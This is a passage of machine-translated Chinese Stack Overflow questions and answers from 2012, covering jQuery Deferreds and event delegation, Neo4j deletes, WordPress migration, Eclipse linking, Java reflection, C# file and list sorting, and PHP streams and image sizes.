    "dijit/layout/BorderContainer"]);
}); 
```

我没有留下live.html，因为它基本上只是HTML 结构、对dojo 加载程序的调用和对`helloapp/app.js`文件的要求。

如果这是 CSP 领域的限制，我是否可以通过其他方式在新的 Chrome 应用程序上使用 Dijit，或者我错过了什么？

谢谢你的时间

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-02T09:56:56.560

您必须修改 Dojo Core、Dojo Base 和 Dijit 中的所有核心源代码以删除卸载事件或重新定义它。

`close()`并且`unload()`非常相似，你可以看到一个关于为什么它没有在这里实现的线程：

[http://code.google.com/p/chromium/issues/detail?id=147674](http://code.google.com/p/chromium/issues/detail?id=147674)

[http://code.google.com/p/chromium/issues/detail?id=130465](http://code.google.com/p/chromium/issues/detail?id=130465)

# javascript - 是否可以在 for 循环完成后使用 Deferred 对象来创建回调？

> ID：13514864
> 
> 赞同：4
> 
> 时间：2012-11-22T14:32:34.133
> 
> 标签：javascript, jquery

我有一个在每个 li 中淡入的 for 循环，我想做的是等到最后一个 li 完全淡入，然后继续使用类似于回调的代码，但我不确定如何实现这一点？我在想我可以使用 Deferred 对象吗？

JS

```
 var newArray = [3,2,6,4,0,1,5];
    for (var i = 0; i < newArray.length; i++) {
      var dfd = $.Deferred();
      $(this).eq(newArray[i]).fadeIn(i * 500);
      dfd.resolve();
      //.. continue with callback code??
    } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-22T14:38:41.003

您可以使用[`$.when`](http://api.jquery.com/jQuery.when/): 通过将所有`fadeIn`调用中的 Deferreds 传递给它，您可以注册一个回调，以便仅在所有调用完成后才执行：

```
var deferreds = [];
for (var i = 0; i < newArray.length; i++) {
    var dfd = $(this).eq(newArray[i]).fadeIn(i * 500);
    deferreds.push(dfd);
}
$.when.apply($, deferreds).then(function() { ... }); 
```

[jsFiddle](http://jsfiddle.net/kwWJ5/)的工作示例。请注意，您可以将 的返回值`fadeIn`用作`Deferred`.

**更新：**由于您希望每个`fadeIn`人只**在**最后一个结束后开始，[Bergi 的回答](https://stackoverflow.com/a/13516365/520779)可能更合适。另一种选择（更简单，恕我直言）可能是：

```
var i = 0;
function f() {
    if ( i < newArray.length ) {
        $(this).eq(newArray[i]).fadeIn(i * 500, f);
        i++;
    } else {
        // Your "done" callback, if any
    }
}
f(); 
```

工作[示例](http://jsfiddle.net/d7UZK/)。我坚持使用您的原始代码（每个效果使用不同的持续时间），但如果您希望它们都具有相同的效果，请删除`i *`并使用`500`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T16:00:21.963

我认为[Deferreds](http://api.jquery.com/category/deferred-object/)在这里不会有很大帮助。当然，您可以[`.promise()`](http://api.jquery.com/promise/)在 jQuery 实例上为每个 [效果] 队列获取一个，并且由于该方法，您甚至可以将 jQuery 对象直接传递给[`$.when`](http://api.jquery.com/jQuery.when/)，但我认为回调链 - 对于连续动画，您需要一些链 - 可以更轻松：

```
function chainedFadeIn($el, order, callback) {
    if (!order.length)
        return callback();
    $el.eq(order.shift()).fadeIn(500, function() {
        chainedFadeIn($el, order, callback); // notice we removed the first element
    }); 
}
chainedFadeIn($(this), [3,2,6,4,0,1,5], function() {
    // do something
}); 
```

带有 Promises 的替代版本：

```
function getFadeInChain($el, order) {
    if (!order.length)
        return order; // or anything else
    return $el
      .eq(order.shift())
      .fadeIn(500)
      .promise()
      .then(getFadeInChain.bind(null, $el, order));
}
getFadeInChain($(this), [3,2,6,4,0,1,5]).done(function() {
    // do something
}); 
```

jsfiddle.net 上的演示：[回调](http://jsfiddle.net/UHT8B/)，[延迟](http://jsfiddle.net/evbHP/1/)

# python - 灯泡 Neo4j 嵌入和密码中的删除

> ID：13514865
> 
> 赞同：1
> 
> 时间：2012-11-22T14:32:36.580
> 
> 标签：python, neo4j, cypher

我通过灯泡使用 neo4j 的 REST API，并尝试通过密码删除一个节点以及所有关联的边缘，如下所示：

```
from bulbs.neo4jserver import Graph as Neo4jGraph
db = Graph()

query = '''START d=node(57)
           MATCH d-[r]-()
           DELETE d,r
        '''
t = db.cypher.execute(query) 
```

（`db`neo4j-database-Handler 在哪里）。

......它似乎并不像那样工作。一个长的错误报告如下：

```
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/home/tobias/Esk/Dev/liquidDemocracyLight/venv/local/lib/python2.7/site-packages/bulbs/neo4jserver/cypher.py", line 31, in execute
    return self.client.cypher(query, params)
  File "/home/tobias/Esk/Dev/liquidDemocracyLight/venv/local/lib/python2.7/site-packages/bulbs/neo4jserver/client.py", line 403, in cypher
    resp = self.request.post(path, params)
  File "/home/tobias/Esk/Dev/liquidDemocracyLight/venv/local/lib/python2.7/site-packages/bulbs/rest.py", line 126, in post
    return self.request(POST, path, params)
  File "/home/tobias/Esk/Dev/liquidDemocracyLight/venv/local/lib/python2.7/site-packages/bulbs/rest.py", line 181, in request
    return self.response_class(http_resp, self.config)
  File "/home/tobias/Esk/Dev/liquidDemocracyLight/venv/local/lib/python2.7/site-packages/bulbs/neo4jserver/client.py", line 217, in __init__
    self.handle_response(response)
  File "/home/tobias/Esk/Dev/liquidDemocracyLight/venv/local/lib/python2.7/site-packages/bulbs/neo4jserver/client.py", line 249, in handle_response
    response_handler(response)
  File "/home/tobias/Esk/Dev/liquidDemocracyLight/venv/local/lib/python2.7/site-packages/bulbs/rest.py", line 36, in bad_request
    raise ValueError(http_resp)
ValueError: ({'status': '400', 'content-length': '3989', 'content-encoding': 'UTF-8', 'server': 'Jetty(6.1.25)', 'access-control-allow-origin': '*', 'content-type': 'application/json'}, '{\n  "message" : "expected return clause\\n\\"           DELETE d,r\\"\\n            ^",\n  "exception" : "org.neo4j.server.rest.repr.BadInputException: expected return clause\\n\\"           DELETE d,r\\"\\n 
```

难道我做错了什么？是否可以通过灯泡通过密码查询删除节点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:51:31.547

看起来您正在运行旧版本的 Neo4j？`DELETE`仅在 1.8 中添加。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T10:56:24.517

Bulbs 具有用于删除节点/顶点及其所有关系的内置方法。

```
>>> from bulbs.neo4jserver import Graph
>>> g = Graph()
>>> g.vertices.delete(57) 
```

请参阅[http://bulbflow.com/docs/api/bulbs/element/#vertex-proxy](http://bulbflow.com/docs/api/bulbs/element/#vertex-proxy)

为此，Bulbs`delete()`方法在后台使用了 Gremlin 脚本，因为 Neo4j 服务器不提供单个端点来删除顶点及其所有事件边。

代码如下所示：

*   [https://github.com/espeed/bulbs/blob/master/bulbs/element.py#L655](https://github.com/espeed/bulbs/blob/master/bulbs/element.py#L655)
*   [https://github.com/espeed/bulbs/blob/master/bulbs/neo4jserver/client.py#L474](https://github.com/espeed/bulbs/blob/master/bulbs/neo4jserver/client.py#L474)
*   [https://github.com/espeed/bulbs/blob/master/bulbs/gremlin.groovy#L110](https://github.com/espeed/bulbs/blob/master/bulbs/gremlin.groovy#L110)

请注意，上面的 Gremlin 脚本使用 Blueprints removeVertex() 方法（内置于 Neo4j Server 中），因为它会为您删除所有事件边缘。

见[https://github.com/tinkerpop/blueprints/blob/master/blueprints-neo4j-graph/src/main/java/com/tinkerpop/blueprints/impls/neo4j/Neo4jGraph.java#L409](https://github.com/tinkerpop/blueprints/blob/master/blueprints-neo4j-graph/src/main/java/com/tinkerpop/blueprints/impls/neo4j/Neo4jGraph.java#L409)

# php - 将数据库从一个域移动到另一个域

> ID：13514867
> 
> 赞同：0
> 
> 时间：2012-11-22T14:32:41.340
> 
> 标签：php, database, wordpress

我试图将 WordPress 网站移动到另一个域。例如： http: [//www.demo.com](http://www.demo.com)到[http://www.localhost/demo](http://www.localhost/demo) .... 我已经从 c-panel 备份了 xml 文件。所有的表都在那里。并且在编辑器中更改了 url。

当我将 xml 文件导入 wordpress 仪表板时，页面/帖子没有上传。只有默认页面和帖子存在同样的问题。

任何人都可以指导我我在做什么错误以及解决方案是什么？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T15:25:21.047

每当我必须将站点移动到不同的域（或从 localhost 移动到网络上的某个位置）时，我都会这样做：

1.  制作文件的副本 - 如果您能够在旧服务器和新服务器上压缩/解压缩文件，只需制作一个包含所有 WordPress 文件（`/wp-admin`、、和根目录中的所有文件）的 .zip 存档，否则`/wp-content`复制`/wp-includes`他们到你的电脑
2.  制作[数据库副本](http://codex.wordpress.org/Backing_Up_Your_Database)
3.  在新服务器上，上传您的文件（如果您制作了 .zip 存档，请上传并解压缩）
4.  在新服务器上导入数据库备份。
5.  上传数据库后，执行以下 SQL 代码（例如，您可以从 phpMyAdmin 执行此操作）

：

```
UPDATE `{%TABLE_PREFIX%}options` SET `option_value` = replace(`option_value`, '{OLD_URL}', '{NEW_URL}');
UPDATE `{%TABLE_PREFIX%}postmeta` SET `meta_value` = replace(`meta_value`, '{OLD_URL}', '{NEW_URL}');
UPDATE `{%TABLE_PREFIX%}posts` SET `post_content` = replace(`post_content`, '{OLD_URL}', '{NEW_URL}');
UPDATE `{%TABLE_PREFIX%}posts` SET `guid` = replace(`guid`, '{OLD_URL}', '{NEW_URL}'); 
```

将`{%...%}`占位符替换为相应的值，如下所示：

`{%TABLE_PREFIX%}`是您的表前缀，如`wp-config.php`

`{OLD_URL}`是站点所在的旧 URL。我通常会跳过`http://`部分和尾部斜杠（有些路径保存，有些没有，所以这样做更安全），所以如果你的网站曾经是 on `http://www.demo.com/`，你会替换`{OLD_URL}`为`www.demo.com`

`{NEW_URL}`是站点将驻留的新 URL。我通常会跳过该`http://`部分和尾部斜杠，因此如果您的网站将驻留在 . 上`http://www.localhost/`，您将替换`{NEW_URL}`为`www.localhost`. 如果新位置是子目录（例如`http://www.localhost/example/`），您将替换`{NEW_URL}`为`www.localhost/example`.

完成所有这些后，只需转到新安装，登录仪表板，转到`Settings > Permalinks`，除非您看到 .htaccess 权限错误，否则一切就绪:)

如果您无法通过 phpMyAdmin 访问数据库，或者无法备份文件，请考虑使用[备份插件](http://wordpress.org/extend/plugins/search.php?q=backup)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:36:11.070

[http://codex.wordpress.org/Moving_WordPress](http://codex.wordpress.org/Moving_WordPress)

导航到移动到新服务器。

[http://codex.wordpress.org/WordPress_Backups](http://codex.wordpress.org/WordPress_Backups)

[http://codex.wordpress.org/Backing_Up_Your_Database](http://codex.wordpress.org/Backing_Up_Your_Database)

# mysql - 添加 C mysql 库 Eclipse CDT 后生成文件错误

> ID：13514873
> 
> 赞同：0
> 
> 时间：2012-11-22T14:32:55.240
> 
> 标签：mysql, c, eclipse, makefile, eclipse-cdt

我正在使用 Eclipse Juno CDT。

我在我的项目中添加了以下内容：

*   包含路径设置的 mysql/includes 路径
*   libmysql.lib 和 zlib.lib 到库设置
*   mysql 库路径到库路径设置

现在，当我制作项目时，运行应用程序时编译会引发错误。这是构建：

```
10:08:56 **** Build of configuration Debug for project mysqlapp ****
make all 
Building file: ../src/mysqlapp.c
Invoking: Cygwin C Compiler
gcc -I"C:\Program Files\MySQL\MySQL Connector C 6.0.2\include" -O0 -g3 -Wall -c -fmessage-length=0 -MMD -MP -MF"src/mysqlapp.d" -MT"src/mysqlapp.d" -o "src/mysqlapp.o" "../src/mysqlapp.c"
cygwin warning: 
MS-DOS style path detected: C:\Users\Yonaton\workspace\mysqlapp\Debug
Preferred POSIX equivalent is: /cygdrive/c/Users/Yonaton/workspace/mysqlapp/Debug
 CYGWIN environment variable option "nodosfilewarning" turns off this warning.
Consult the user's guide for more details about POSIX paths:
http://cygwin.com/cygwin-ug-net/using.html#using-pathnames
Finished building: ../src/mysqlapp.c

Building target: mysqlapp.exe
Invoking: Cygwin C Linker
gcc -L"C:\Program Files\MySQL\MySQL Connector C 6.0.2\lib\opt" -o "mysqlapp.exe"  ./src/mysqlapp.o   
Finished building target: mysqlapp.exe 
```

这是 Eclipse 中的运行：

```
10:09:55 **** Incremental Build of configuration Debug for project mysqlapp ****
make all 
src/mysqlapp.d:1: *** multiple target patterns.  Stop.

10:09:56 Build Finished (took 225ms) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:39:05.513

如果我没记错的话，在您的库之前使用“-l”（小 L）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:53:04.180

下`Project->Properties->C/C++ General->Paths and Symbols->Libraries`不要添加库的文件名，也不要添加路径。

因此，如果您想链接，`/lib64/libz.so`只需添加`z`.

或交替添加`z`under `Project->Properties->C/C++ Build->Settings->GCC Linker->Libraries`。

如果库不在标准路径下，请在`Project->Properties->C/C++ General->Paths and Symbols->Libraries Paths`.

* * *

**更新（指“多个目标模式”）**：

`make`不喜欢 DOS 路径。在`.d`文件`:`中，驱动器号后面的 a 被解释为目标分隔符。

切换到 UNIX 路径（正如您已经被告知要做的那样...... ;-)）。

（另请参见：[“多个目标模式”Makefile 错误](https://stackoverflow.com/questions/2100448/multiple-target-patterns-makefile-error)）

# java - 我可以使用 Java 中的方法使用反射获取字段（变量/属性）名称吗？

> ID：13514874
> 
> 赞同：0
> 
> 时间：2012-11-22T14:32:57.487
> 
> 标签：java, reflection

我可以使用反射在 Java 中使用方法获取字段（变量/属性）名称吗？我在下面的代码中解释我的场景。

例如，我有一节课

```
class MyBean
{
    String name;
    String Name;

    public String getName() {
        return Name;
    }
    public void setName(String name) {
        this.Name = name;
    }
} 
```

现在我想通过使用 java.lang.reflect.Method "getName()" 来输入字段 "Name" ...我能得到它吗？

我想要这样的功能..

```
public String getFieldName(Method method)
{
    String fieldName=null;

    // code for finding field/variable/property name using method

    return fieldName;
} 
```

请帮助我，如果可能的话......提前谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:55:35.840

This works, but your class is not cleanly defined.
Fields should be named using camelCase notation starting with a lower char:

```
class Info
{
    public String name1;
    private String name2;
} 
```

Now you have an object info:

```
Info info; 
```

Then you want to get the value of name1:

Here is a full Test case showing all:

```
public class InfoTest extends TestCase{

public static class Info {

    private    String name1;
    public     String name2;
    protected  String name3;
    String name4;

    /**
     * Default constructor.
     */
    public Info() {
        name1 = "name1Value";
        name2 = "name2Value";
        name3 = "name3Value";
        name4 = "name4Value";
    }

}

public void testReflection() throws IllegalArgumentException, IllegalAccessException {

    Info info1 = new Info();

    Field[] infoFields = info1.getClass().getDeclaredFields();
    for (int i = 0; i < infoFields.length; i++) {
        Field fieldName = infoFields[i];
        System.out.println("the name of the field " + i +  ":" + fieldName.getName());
        fieldName.setAccessible(true);
        Object info1ValObj = infoFields[0].get(info1);
        System.out.println("the value of the field: " + info1ValObj.toString());
    }
} 
```

}

The output then is:
the name of the field 0:name1
the value of the field: name1Value
the name of the field 1:name2
the value of the field: name1Value
the name of the field 2:name3
the value of the field: name1Value
the name of the field 3:name4
the value of the field: name1Value

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:49:58.300

如果你按照 JavaBeans 约定命名你的字段，这应该做所有的事情：

```
public String getFieldName(Method method) {
    return method.getName().substring(3).toLowerCase();
} 
```

所以 getName() 或 setName() 应该返回“name”

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-22T14:35:08.957

你的意思是？

```
public String getFieldName(Method method) {
    return method.getName().substring(3);
} 
```

`camcelCase`顺便说一句：字段名称不应该是`TitleCase`

# c# - 如何根据日期从文件夹中获取文件

> ID：13514875
> 
> 赞同：-1
> 
> 时间：2012-11-22T14:33:08.080
> 
> 标签：c#, c#-2.0

我在具有命名约定的文件夹中有多个文件

```
Name_MoreName_DDMMYYYY_SomeNumber_HHMMSS.txt 
```

如何获取具有最旧日期和时间的文件（即最旧的 DDMMYYYY 和 HHMMSS）。

前任：

*   Name_MoreName_22012012_SomeNumber_072334.txt
*   Name_MoreName_22012012_SomeNumber_072134.txt
*   Name_MoreName_24012012_SomeNumber_072339.txt
*   Name_MoreName_22012012_SomeNumber_072135.txt

所以最旧的文件将是

```
Name_MoreName_22012012_SomeNumber_072134.txt 
```

我怎样才能只取最旧的文件？

**编辑** 这是我到目前为止所做的......在forach循环中我正在一个一个地读取文件名

```
private void FileInformation(string fileName, ref string concatFile)
        {
            try
            {
                string completeFileName = fileName.Trim();
                string[] fileComponenets = completeFileName.Split('_');

                string fileDate = string.Empty;
                string fileTime = string.Empty;

                if (fileComponenets.Length > 0)
                {
                    fileDate = fileComponenets[4].Replace(".txt", "").Trim();
                    fileTime = fileComponenets[2].ToString();
                    concatFile = fileDate + "-" + fileTime;
                }

            }

            catch (Exception ex)
            {
                            }

        } 
```

- 主功能

```
string fileStats = string.Empty;
 foreach (string filePath in arrFileCollection)
                {
                    if (filePath.ToLower().Contains("Name_MoreName_")&&
                        filePath.ToLower().Contains(".txt"))
                    {
                                                string concatFile = string.Empty;
                        FileInformation(filePath.Replace(dirPath, ""), ref concatFile);
                        fileStats = fileStats + "," + concatFile;
                    }
} 
```

现在我在一个带有逗号分隔值的字符串中获取所有日期时间。现在我被困住了。我怎样才能取其中最小的并获取相关文件

**编辑2**

注意：框架是 .NET 2.0

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:43:31.593

```
string oldestFile = Directory.EnumerateFiles(path)
                             .OrderBy(file => ExtractDateTimeFrom(file))
                             .First(); // FirstOrDefault 
```

并编写将解析您的文件名并从中提取日期的方法：

```
public static DateTime ExtractDateTimeFrom(string fileName)
{
    Regex regex = new Regex(@".+_(\d\d\d\d\d\d\d\d)_.+_(\d\d\d\d\d\d).txt");
    var match = regex.Match(fileName);
    string dateString = match.Groups[1].Value + match.Groups[2].Value;
    return DateTime.ParseExact(dateString, "ddMMyyyyHHmmsss", null);
} 
```

**.NET 2.0**最简单的解决方案：

```
string oldestFile = "";
DateTime oldestDate = DateTime.Max;

foreach(string fileName in Directory.GetFiles(path))
{
    DateTime date = ExtractDateTimeFrom(fileName);
    if (date < oldestDate)
    {
        oldestFile = fileName;
        oldestDate = date;
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:47:26.703

使用 DirectoryInfo 和 FileInfo 类。例如，只是为了给出想法：

```
 IOrderedEnumerable<FileInfo> filesInfo =  new DirectoryInfo("D:\\")
                                                      .EnumerateFiles()
                                                      .OrderBy(f=>f.FullName); 
```

更新：对于.NET 2.0，我建议您将比较逻辑与您的主代码分开......所以为什么不创建一个实现 IComparable 接口的自定义类型。

```
public class CustomFileInfo :IComparable<CustomFileInfo>
{
    public string Name { get; set; }
    public string MoreName { get; set; }
    public DateTime FileDate { get; set; }
    public int Number { get; set; }
    public DateTime FileTime { get; set; }

    public CustomFileInfo(string fileNameString)
    {
        string[] fileNameStringSplited = fileNameString.Split('_');
        this.Name = fileNameStringSplited[0];
        this.MoreName = fileNameStringSplited[1];
        this.FileDate = DateTime.ParseExact(fileNameStringSplited[2], "ddMMyyyy", null);
        this.Number = int.Parse(fileNameStringSplited[3]);
        this.FileTime = DateTime.ParseExact(fileNameStringSplited[4], "HHmmss", null);
    }

    public int CompareTo(CustomFileInfo other)
    {
        // add more comparison criteria here
        if (this.FileDate == other.FileDate) 
            return 0;
        if (this.FileDate > other.FileDate)
            return 1;
        return -1;
    }
} 
```

然后在您的代码中，您可以使用 DirectoryInfo 简单地获取文件并比较每个文件...

```
 FileInfo[] filesInfo = new DirectoryInfo("D:\\").GetFiles();
    //set first file initially as minimum
    CustomFileInfo oldestFileInfo = new CustomFileInfo(filesInfo[0].FullName);

    for (int i = 1; i < filesInfo.Length; i++)
    {
            CustomFileInfo currentFileInfo = new CustomFileInfo(filesInfo[i].FullName);
        //compare each file and keep the oldest file reference in oldestFileInfo
            if (oldestFileInfo.CompareTo(currentFileInfo) < 0)
                oldestFileInfo = currentFileInfo;
    } 
```

您可以优化代码以供使用并根据您的标准自定义比较代码。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-22T14:50:39.673

用这个：

**更新**

```
List<string> address = new List<string>() { "Name_MoreName_22012011_SomeNumber_072334.txt",
            "Name_MoreName_22012012_SomeNumber_072134.txt",
            "Name_MoreName_24012012_SomeNumber_072339.txt",
            "Name_MoreName_22012012_SomeNumber_072135.txt",};
            DateTimeFormatInfo dtfi = new DateTimeFormatInfo();
            dtfi.ShortDatePattern = "dd-MM-yyyy";
            dtfi.DateSeparator = "-";
            address = address.OrderBy(s => Convert.ToDateTime((s.Split('_')[2]).Insert(2, "-").Insert(5, "-"), dtfi)).ToList();
            string oldest = address[0]; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-22T14:53:01.783

像这样的东西？

```
 string[] filePaths = Directory.GetFiles(@"c:\MyDir\");
        Regex rex          = new Regex(@"^.*_(\d+)\.txt");
        int date           = int.MaxValue;
        int oldestdate     = int.MaxValue;
        String oldestfile;
        foreach(String filePath in filePaths)
        {
            Match match = rex.Match(filePath);

            if(match.Success)
                date = int.Parse(match.Groups[0].Value);
            if (date < oldestdate)
            {
                oldestdate = date;
                oldestfile = filePath;
            }
        } 
```

# javascript - Jquery点击处理程序不在表中工作

> ID：13514878
> 
> 赞同：7
> 
> 时间：2012-11-22T14:33:17.770
> 
> 标签：javascript, jquery

我正在使用一个名为 Jquery Content Panel Switcher 的 Jquery 插件。它完全符合标题所说的，它可以轻松切换 div。该页面的html是：

```
<!--The switcher buttons, basic anchor tags, with the switcher class -->
<a id="content1" class="switcher">One</a>
<a id="content2" class="switcher">Two</a>

<!-- The panel you wish to use to display the content -->
<div id="switcher-panel"></div>

<!-- The actual content you want to switch in and out of the panel, this is hidden -->
<div id="content1-content" class="switcher-content show"></div>
<div id="content2-content" class="switcher-content show"></div> 
```

在我的每个内容面板中，我都有一个表格。在每个表格中都有一个表格：

```
<table class="table table-hover" data-controller="rank">
  <thead>
    <tr>
      <th colspan="4" align="left"><h2>Rank 1</h2></th>
    </tr>
    <tr>
      <th>Number</th>
      <th>Requirements</th>
    </tr>
  </thead>
  <tbody>
    <tr data-name="one_li">
      <td>1</td>
      <td>Info</td>
    </tr>
    <tr data-name="two_li">
      <td>2</td>
      <td>More Info</td>
      </td>
    </tr>
  </tbody>
</table> 
```

如果单击某行，我试图触发一个动作。这是我正在使用的javascript：

```
$(document).ready(function(){
  $('#switcher-panel form table tbody tr').click(function(){
     console.log("Clicked");
   });
}); 
```

当我在 Chrome 控制台中使用 Jquery 选择器时`$('#switcher-panel form table tbody tr')`，它会找到表格并且一切看起来都很好。当我把它放在我的 javascript 文件中时，什么也没有发生。一些方向会很棒。谢谢您的帮助。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-22T14:37:07.337

这将起作用：

```
$('#switcher-panel').on('click', 'table tr', function() {
    console.log("Clicked", this);
}); 
```

[例子](http://fiddle.jshell.net/B2rud/)

如果单击的子项位于选择器之下，则这会向其添加一个侦听器来`#switcher-panel`侦听其子项上的事件。`click``'table tr'`

[查看这篇文章](http://24ways.org/2011/your-jquery-now-with-less-suck/)以获取有关事件委托的更多信息。^(（Ctrl+f 用于事件委托）)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-22T14:35:59.120

如果面板的内容是动态附加的，您需要将点击事件委托给静态父元素。尝试这个：

```
$('#switcher-panel').on('click', 'form table tbody tr', function(){
    console.log("Clicked");
}); 
```

我的猜测是您也可以将子选择器缩短`table tr`为。

# php - 如何在php中录制flash流

> ID：13514880
> 
> 赞同：0
> 
> 时间：2012-11-22T14:33:27.267
> 
> 标签：php, flash, http, stream

我想使用 php 录制 flash 流。你们知道怎么做吗？我想要脚本记录例如 youtube 文件播放。我有 VPS，所以它可以使用一些软件。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:59:10.090

您可以制作简单地下载流数据并将其保存在文件中的脚本，但在这种情况下，您必须禁用该文件的 30 秒限制。可以制作每 30 秒以无限循环调用自身的脚本，但在这种情况下，您可能会丢失原始流中的一些字节。但我不建议使用 PHP 来执行此操作。该语言旨在为用户和终端（其“脚本”）快速处理数据。

最简单的脚本：

```
<?php
  $con = fsockopen("example.com",80):
  $file = fopen("data.flv","a");
  /*connection test skipped here*/
  fwrite("GET /stream1.flv HTTP/1.1\r\n",$con);
  fwrite("Connection: keep-alive\r\n",$con);
  fwrite("\r\n",$con);  //End of request data
  while(!eof($con)) {
    $bytes = fread($con,16);
    fwrite($file,$bytes);
  }
 ?> 
```

确实不推荐。

# c - 什么是条件 mov (cmov) 示例的（工作）示例？

> ID：13514881
> 
> 赞同：1
> 
> 时间：2012-11-22T14:33:28.610
> 
> 标签：c, x86, inline-assembly

什么是条件 mov (cmov) 示例的（工作）示例？首选 C 中的内联 asm。我不确定它之前是否需要 cmp 。另外，我尝试用 Cmov 制作以下内容，但做不到。

```
int n = 0, d;
int a[5];
a[0] = 134;
a[1] = 70;
a[2] = 735;
...
__asm
{
LEA edi, a
mov eax, 150
//cmp eax, 128 ; if legal & needed
cmovae eax,[EDI+1]
mov d, eax
} 
```

欢迎 VC 或 GCC！请解释更多关于 cmov 的信息。

# c# - 如何对列表进行排序 通过该字符串 Desc 的一部分

> ID：13514885
> 
> 赞同：2
> 
> 时间：2012-11-22T14:33:43.940
> 
> 标签：c#, string, list, sorting

我有一个这样的清单：

```
List<string> list_lines = new List<string>();
list_lines.add("name1__pass1__com__14__55");
list_lines.add("name2__pass2__com__14__5445");
list_lines.add("name3__pass3__com__14__456456");
list_lines.add("name4__pass4__com__14__1357");
list_lines.add("name5__pass5__com__14__20000");
list_lines.add("name6__pass6__com__14__25");
list_lines.add("name7__pass7__com__14__12"); 
```

和更多...

如您所见，该列表中的每个字符串中都有一个分隔符->“__”。
意思是 ：

```
string[] Separator = new string[] { "__" };   

foreach(string s in list_lines)
{
    string[] line_ar = s.Split(Separator, StringSplitOptions.None);
    int Num  = int.parse(line_ar[4]);
} 
```

我想按该列表的 Num 部分对该列表进行排序。
我使用 StackOverflow 测试了一些方法，但其中有一个大列表的错误。

非常感谢帮助我解决它

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-22T14:37:39.880

上升：

```
list_lines = list_lines.OrderBy(s => int.Parse(s.Split(Separator, StringSplitOptions.None)[4])).ToList(); 
```

描述：

```
list_lines = list_lines.OrderByDescending(s => int.Parse(s.Split(Separator, StringSplitOptions.None)[4])).ToList(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-22T14:37:23.080

```
var myList = list_lines.OrderBy(x => int.Parse(x.Split(new string[] {"__"}, StringSplitOptions.None)[4])).ToList(); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-22T14:38:51.463

如果数字总是在最后一个下划线字符之后开始，那么这应该有效：

```
var sortedList = list_lines
    .OrderByDescending(l => int.Parse(l.Substring(l.LastIndexOf("_") + 1)))
    .ToList(); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-22T15:04:48.610

其他答案会创建一个按您想要的方式排序的**新列表。**相反，如果您希望对**相同**的列表进行排序，则可以尝试以下操作：

```
Func<string, int> getNum = str => int.Parse(str.Split(Separator, StringSplitOptions.None)[4]);
list_lines.Sort((x, y) => getNum(x).CompareTo(getNum(y))); 
```

这使用[了`List<>.Sort`](http://msdn.microsoft.com/en-us/library/w56d4y5z.aspx). 如果您想要降序，请在lambda 正文中交换`x`和。`y``Comparison<>`

如果您的列表*很*长，这会更快（使用快速排序）并且不需要存储列表的新副本。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-22T14:42:55.073

您可以利用 LINQ 函数中的 lambda 表达式，例如`OrderBy`

```
string[] Separator = new string[] { "__" };
var sortedList = list_lines
    .OrderBy(s => int.Parse(s.Split(Separator, StringSplitOptions.None)[4]))
    .ToList(); 
```

作为一个无关的旁注，请使用正确的 C# 命名约定，以便您的代码更易于阅读并与现有的 C# 代码库统一。`Separator`例如，不以大写字母 ( -> )开头的局部变量名，`separator`并使用小写驼峰式 (Pascal 大小写)，以防它包含更多单词 ( `list_lines`-> `listLines`)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-03-23T21:37:31.570

请原谅我在这里回答相关问题：

```
Sat 2020-03-21 06:03:31.129: 03: [100001] Player 1
Sat 2020-03-21 06:03:33.119: 02: [620524] Player 22 
```

*我想首先按以下方式对列表进行排序：1）两个[]中的数字2）直到：nn：*

这是一种方法（多种方法）：

```
void Main()
{
    var originalList = new List<string>
    {
        @"Sat 2020-03-21 06:03:31.129: 03: [100001] Player 1",
        @"Sat 2020-03-21 06:03:33.119: 02: [620524] Player 22",
    };
    var sortableList = originalList.Select(x => splitTheLine(x));
    var result = sortableList.OrderBy(x => x.numberPart).ThenBy(x => x.datePart).Select(x => x.wholeString);
}

(DateTime datePart, int numberPart, string wholeString) splitTheLine(string x)
{
    string[] separator = { "[", "]", ": " };
    var result = x.Split(separator, StringSplitOptions.None);
    return (DateTime.Parse(result[0]), int.Parse(result[3]), x );
} 
```

我定义了一种方法`splitTheLine`来提取*日期*和*数字*部分以及原始字符串。它返回一个元组。然后我使用`select`LINQ 运算符的方法来检索具有三个“列”的列表。再次使用 LINQ，使用`OrderBy`and`ThenBy`运算符对列表进行排序。最后，我`select`只使用结果的原始字符串。

这个解决方案可以缩短很多 - 但像往常一样以可读性为代价。

# php - 快速计算图像高度和宽度

> ID：13514888
> 
> 赞同：0
> 
> 时间：2012-11-22T14:33:47.707
> 
> 标签：php, image

我有以下程序可以快速计算图像的高度和宽度，就像比较 getImageSize(); PHP 函数。原因？需要将远程图像下载到您的服务器中，然后由 php 在本地读取。

```
<?php
   function getimagesize($image_url){
    $handle = fopen ($image_url, "rb");
    $contents = ""; 
            if ($handle) {
                do {
                    $count += 1;
                    $data = fread($handle, 8192);
                        if (strlen($data) == 0) {
